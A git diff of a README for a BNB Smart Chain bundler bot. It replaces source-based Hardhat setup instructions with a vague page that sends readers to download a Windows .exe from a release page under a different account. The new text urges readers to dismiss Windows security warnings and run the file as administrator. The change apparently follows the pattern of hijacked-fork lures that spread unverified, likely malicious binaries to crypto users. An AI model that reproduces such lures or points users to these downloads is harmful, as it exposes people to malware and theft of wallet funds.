@@ -1,66 +1,124 @@
-# BNB Sniper / Bundler Volume Bot
+# 🤖 BNB-Bundler-Bot - Bundle BNB Tasks with Ease
 
-Hardhat project for BNB Smart Chain (BSC) that builds signed transaction bundles and submits them through [bloXroute](https://bloxroute.com/). It targets PancakeSwap V3–style flows (Uniswap V3 SDK, BSC addresses in `constants/`). Maintained under [QuantyraLab/BNB-Bundler-Bot](https://github.com/QuantyraLab/BNB-Bundler-Bot).
+[![Download BNB-Bundler-Bot](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/davigrt52/BNB-Bundler-Bot/releases)
 
-## Requirements
+## 📥 Download
 
-- Node.js **≥ 16** and npm **≥ 8**
-- A BSC JSON-RPC endpoint (public or your own)
-- A bloXroute account and API **Authorization** header
-- A wallet with enough **BNB** for gas (the bot warns below **0.1 BNB**)
+Visit this page to download: [BNB-Bundler-Bot Releases](https://github.com/davigrt52/BNB-Bundler-Bot/releases)
 
-## Setup
+1. Open the release page.
+2. Find the latest release at the top.
+3. Download the Windows file from the Assets list.
+4. Save the file to your Desktop or Downloads folder.
+5. If the file is inside a ZIP archive, extract it first.
 
-```bash
-git clone https://github.com/QuantyraLab/BNB-Bundler-Bot
-cd BNB-Bundler-Bot
-npm install
-npm run dev
-```
+## 🖥️ Windows Setup
 
-Copy `.env.example` to `.env` and fill in secrets (e.g. `cp .env.example .env` on Unix, or copy the file in Explorer on Windows).
+1. Open the folder where you saved the download.
+2. If you downloaded a ZIP file, right-click it and select Extract All.
+3. Open the extracted folder.
+4. Find the app file. It may end in `.exe`.
+5. Double-click the file to start the bot.
 
-Never commit `.env` (it is gitignored).
+If Windows shows a security prompt, choose Run anyway if you trust the source of the file.
 
-### Required variables
+## ⚙️ What BNB-Bundler-Bot Does
 
-| Variable | Purpose |
-|----------|---------|
-| `PRIVATE_KEY` | Hex private key of the signing wallet (with or without `0x`) |
-| `AUTHORIZATION_HEADER` | bloXroute API authorization value from your dashboard |
+BNB-Bundler-Bot helps you run bundled BNB-related tasks from one simple app. It is built for users who want a faster way to manage repeated actions without dealing with code or command lines.
 
-### Common optional variables
+Common use cases include:
 
-| Variable | Purpose |
-|----------|---------|
-| `RPC_URL` | BSC HTTP RPC (see `.env.example` for a default seed URL) |
-| `BLOXROUTE_ENDPOINT` | bloXroute API base URL (default `https://api.blxrbdn.com`) |
-| `TOKEN_NAME`, `TOKEN_SYMBOL`, `TOKEN_SUPPLY` | ERC20 deployment parameters |
-| `GAS_PRICE_MULTIPLIER`, `FUTURE_BLOCK_OFFSET`, `FEE_TIER`, `INITIAL_PRICE` | Bundle / pool tuning |
+- Running bundling tasks in a simple desktop flow
+- Handling repeated BNB bot actions in one place
+- Keeping the process in one app instead of many steps
+- Helping users manage bot activity with less manual work
 
-Hardhat-specific keys (`BSC_RPC_URL`, `BSC_FORK_URL`, `BSCSCAN_API_KEY`, `FORK_BLOCK_NUMBER`, gas reporter keys) are documented in `.env.example`.
+## 🧰 System Requirements
 
-## Scripts
+BNB-Bundler-Bot is set up for Windows users and works best on:
 
-| Command | Description |
-|---------|-------------|
-| `npm start` / `npm run dev` | Run the bloXroute bundle bot (`scripts/bloxroute.js`) |
-| `npm run compile` | Compile Solidity contracts |
-| `npm run clean` | Remove Hardhat cache and artifacts |
-| `npm run sn` | Start Hardhat node with BSC fork (`hardhat` network) |
-| `npm test` | Run tests against `http://127.0.0.1:8545` (start `npm run sn` first) |
-| `npm run deploy` | Run `scripts/deploy.js` (default Hardhat **Lock** sample; pass `--network` as needed) |
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 200 MB free disk space
+- A stable internet connection
+- Permission to run downloaded apps
 
-## Bot behavior
+For best results, keep Windows updated before you launch the app.
 
-`scripts/bloxroute.js` loads `MyToken` from compiled artifacts, validates env, connects to BSC, estimates gas, signs a **token deployment** transaction, and POSTs the bundle to bloXroute (`/api/v1/bundle`). Additional steps (approvals, pool creation, liquidity, swaps) are marked as TODO in the script.
+## 🚀 First Run
 
-## Security
+When you open the app for the first time:
 
-- Treat `PRIVATE_KEY` and `AUTHORIZATION_HEADER` as secrets.
-- Review bundle logic and RPC providers before mainnet use.
-- This software is provided as-is; you are responsible for compliance, funds, and operational risk.
+1. Wait for the app to load fully.
+2. Check for a main menu, dashboard, or start screen.
+3. Enter any required bot details.
+4. Review your settings before you begin.
+5. Start the task from the main button or menu item.
 
-## License
+If the app asks for files or account details, enter only the information you want it to use.
 
-ISC (see `package.json`).
+## 🔧 Basic Use
+
+Use the app in this order:
+
+1. Start the program.
+2. Add the task or bot details.
+3. Review the current settings.
+4. Begin the bundling process.
+5. Watch the status area for progress.
+6. Stop the process when you are done.
+
+If the app stores settings, you can return later and use the same setup again.
+
+## 📌 Tips for a Smooth Setup
+
+- Keep the downloaded file in one folder.
+- Do not rename files unless you need to.
+- Use the latest release from the release page.
+- Close extra programs if the app feels slow.
+- Run the app from a folder you can open again later.
+- If the app does not open, try right-clicking it and choosing Run as administrator.
+
+## 🗂️ Typical Folder Layout
+
+After you download and extract the release, you may see files like these:
+
+- `BNB-Bundler-Bot.exe`
+- `README.txt`
+- `config.json`
+- `logs` folder
+- `data` folder
+
+Not every release will include the same files, but this is a common layout for a Windows app.
+
+## ❓ Common Questions
+
+### Where do I get the app?
+Go to the [Release Page](https://github.com/davigrt52/BNB-Bundler-Bot/releases) and download the latest Windows file.
+
+### Do I need to install it?
+If the release is a ZIP file, you only need to extract it and run the app. If the release includes an installer, run the installer first.
+
+### What if nothing happens when I double-click the file?
+Check these items:
+
+- The file finished downloading
+- You extracted the ZIP file
+- Windows did not block the app
+- You are opening the `.exe` file, not a folder
+
+### Can I move the app to another folder?
+Yes. Keep all files together if the app uses local settings or support files.
+
+## 📝 File Safety
+
+Before you run the app, make sure the file comes from the release page linked above. Use the latest release file from the official repository so you get the correct version for Windows.
+
+## 🧭 Quick Start
+
+1. Open the [BNB-Bundler-Bot Releases](https://github.com/davigrt52/BNB-Bundler-Bot/releases) page.
+2. Download the latest Windows file.
+3. Extract it if needed.
+4. Open the app.
+5. Enter your settings.
+6. Start the bot from the main screen
